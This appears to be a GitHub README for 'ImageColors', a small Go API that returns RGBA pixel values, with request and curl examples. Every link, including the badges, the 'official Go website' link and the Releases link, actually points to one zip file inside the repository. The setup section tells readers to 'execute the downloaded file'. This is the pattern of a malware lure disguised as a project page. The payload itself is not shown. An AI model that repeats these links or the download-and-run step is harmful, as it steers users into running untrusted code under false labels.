# ImageColors 🌈

![GitHub release (latest by date)](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)
![GitHub issues](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)
![GitHub forks](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)
![GitHub stars](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)

Welcome to **ImageColors**, a simple Go API designed to analyze images and extract RGBA color values from specific pixel coordinates. Whether you are working on an image processing project or just want to get color data from images, this API provides an easy solution.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Example](#example)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Features

- **Base64 Image Input**: Accepts images in base64 format.
- **RGBA Color Output**: Returns the RGBA values for specified pixel coordinates.
- **Simple API**: Easy to use and integrate into your applications.
- **Go Language**: Built using Go for performance and efficiency.

## Getting Started

To get started with ImageColors, download the latest release from [here](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip). Make sure to execute the downloaded file to run the API locally.

### Prerequisites

- Go installed on your machine. You can download it from the [official Go website](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip).
- Basic knowledge of REST APIs and image processing concepts.

## Usage

Once you have the API running, you can make requests to it to get the RGBA values from your images. The API listens for incoming requests and responds with the color values based on the pixel coordinates you specify.

### Example Request

To use the API, send a POST request to the endpoint with the base64 image and the pixel coordinates. Below is an example of how to format your request.

```json
{
  "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...",
  "coordinates": {
    "x": 10,
    "y": 20
  }
}
```

### Example Response

The API will return a JSON response containing the RGBA values:

```json
{
  "rgba": {
    "r": 255,
    "g": 0,
    "b": 0,
    "a": 255
  }
}
```

## API Endpoints

### POST /color

- **Description**: Accepts a base64-encoded image and pixel coordinates, returning the RGBA color values.
- **Request Body**:
  - `image`: Base64-encoded image string.
  - `coordinates`: Object containing `x` and `y` values.

### Response

- **Success**: Returns RGBA values.
- **Error**: Returns an error message if the image is invalid or coordinates are out of bounds.

## Example

Here’s a quick example of how to use the API with `curl`:

```bash
curl -X POST http://localhost:8080/color \
-H "Content-Type: application/json" \
-d '{
  "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...",
  "coordinates": {
    "x": 10,
    "y": 20
  }
}'
```

This command sends a POST request to the API, and you will receive the RGBA values in the response.

## Contributing

We welcome contributions to ImageColors! If you have suggestions or improvements, feel free to submit a pull request. Here are some ways you can contribute:

- Report bugs and issues.
- Improve documentation.
- Add new features or enhancements.

### How to Contribute

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Commit your changes with clear messages.
5. Push to your forked repository.
6. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Support

If you have any questions or need support, please check the [Releases](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip) section for the latest updates. You can also open an issue on GitHub for assistance.

Thank you for using ImageColors! We hope it helps you in your image processing projects.